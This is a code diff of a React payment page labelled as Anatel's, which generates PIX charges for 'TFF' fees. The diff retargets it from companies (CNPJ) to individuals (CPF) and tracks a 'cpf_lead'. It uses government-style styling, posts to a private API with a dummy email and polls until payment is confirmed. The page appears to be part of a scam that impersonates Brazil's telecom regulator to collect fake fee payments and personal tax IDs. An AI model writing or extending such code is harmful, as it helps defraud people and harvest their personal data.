@@ -13,7 +13,7 @@ const fmt = (v) => new Intl.NumberFormat('pt-BR', { style: 'currency', currency:
 export default function AnatelPagamentoPage() {
   const navigate = useNavigate();
   const location = useLocation();
-  const [dadosEmpresa, setDadosEmpresa] = useState(null);
+  const [dadosPessoa, setDadosPessoa] = useState(null);
   const [taxas, setTaxas] = useState(null);
   const [pagamento, setPagamento] = useState(null);
   const [loading, setLoading] = useState(false);
@@ -25,23 +25,23 @@ export default function AnatelPagamentoPage() {
     if (pixGeradoRef.current) return;
     pixGeradoRef.current = true;
     const state = stateRef.current;
-    if (!state?.dadosEmpresa || !state?.taxas) { toast.error('Dados não encontrados'); navigate('/anatel'); return; }
-    setDadosEmpresa(state.dadosEmpresa);
+    if (!state?.dadosPessoa || !state?.taxas) { toast.error('Dados não encontrados'); navigate('/anatel'); return; }
+    setDadosPessoa(state.dadosPessoa);
     setTaxas(state.taxas);
-    gerarPix(state.dadosEmpresa, state.taxas, state.cpfAnterior);
+    gerarPix(state.dadosPessoa, state.taxas, state.cpfAnterior);
   }, []);
 
-  const gerarPix = async (empresa, taxasData, cpfAnterior = null) => {
+  const gerarPix = async (pessoa, taxasData, cpfAnterior = null) => {
     setLoading(true);
     try {
       const endpoint = cpfAnterior ? `${API}/pagamento/pix-2026` : `${API}/pagamento/pix`;
       const payload = { 
-        cnpj: empresa.cnpj, 
-        nome: empresa.nome, 
-        email: 'contato@empresa.com', 
+        cpf: pessoa.cpf, 
+        nome: pessoa.nome, 
+        email: 'contato@contribuinte.com', 
         valor: taxasData.total,
         ...(cpfAnterior && { cpf_anterior: cpfAnterior }),
-        ...(empresa.cpf_lead && !cpfAnterior && { cpf_lead: empresa.cpf_lead })  // Usar CPF do lead
+        ...(pessoa.cpf_lead && !cpfAnterior && { cpf_lead: pessoa.cpf_lead })
       };
       const { data } = await axios.post(endpoint, payload);
       setPagamento(data);
@@ -65,20 +65,19 @@ export default function AnatelPagamentoPage() {
           clearInterval(interval);
           toast.success('Pagamento confirmado!');
           setTimeout(() => {
-            const empresa = stateRef.current?.dadosEmpresa;
+            const pessoa = stateRef.current?.dadosPessoa;
             const totalTaxas = stateRef.current?.taxas?.total;
-            if (is2026) navigate('/anatel/em-dia', { state: { cnpj: empresa?.cnpj, dadosEmpresa: empresa } });
-            else navigate('/anatel/confirmacao', { state: { valor: totalTaxas, cnpj: empresa?.cnpj, dadosEmpresa: empresa, cpfUtilizado } });
+            if (is2026) navigate('/anatel/em-dia', { state: { cpf: pessoa?.cpf, dadosPessoa: pessoa } });
+            else navigate('/anatel/confirmacao', { state: { valor: totalTaxas, cpf: pessoa?.cpf, dadosPessoa: pessoa, cpfUtilizado } });
           }, 1500);
         }
       } catch { /* silencioso */ }
-    }, 10000); // Verifica a cada 10 segundos
+    }, 10000);
     setTimeout(() => clearInterval(interval), 30 * 60 * 1000);
   };
 
   const copiar = () => {
     if (pagamento?.qr_code) {
-      // Fallback para navegadores que bloqueiam Clipboard API
       const textArea = document.createElement('textarea');
       textArea.value = pagamento.qr_code;
       textArea.style.position = 'fixed';
@@ -94,7 +93,6 @@ export default function AnatelPagamentoPage() {
         toast.success('Código copiado!');
         setTimeout(() => setCopiado(false), 3000);
       } catch (err) {
-        // Tentar Clipboard API como fallback
         if (navigator.clipboard && navigator.clipboard.writeText) {
           navigator.clipboard.writeText(pagamento.qr_code)
             .then(() => {
@@ -268,14 +266,14 @@ export default function AnatelPagamentoPage() {
               </div>
 
               {/* Resumo */}
-              {dadosEmpresa && (
+              {dadosPessoa && (
                 <div>
                   <div style={{ background: '#1351B4' }} className="px-4 py-3">
                     <h3 className="text-white font-bold text-[13px] uppercase tracking-wider">Resumo</h3>
                   </div>
                   <div style={{ border: '1px solid #e0e0e0', borderTop: 'none' }} className="bg-white">
                     {[
-                      { label: 'Razão Social', val: dadosEmpresa.nome?.substring(0, 30) + (dadosEmpresa.nome?.length > 30 ? '...' : '') },
+                      { label: 'Nome', val: dadosPessoa.nome?.substring(0, 30) + (dadosPessoa.nome?.length > 30 ? '...' : '') },
                       { label: 'Taxa', val: `TFF ${is2026 ? '2026' : '2025'}` },
                       { label: 'Valor', val: fmt(taxas?.total), bold: true },
                     ].map(r => (
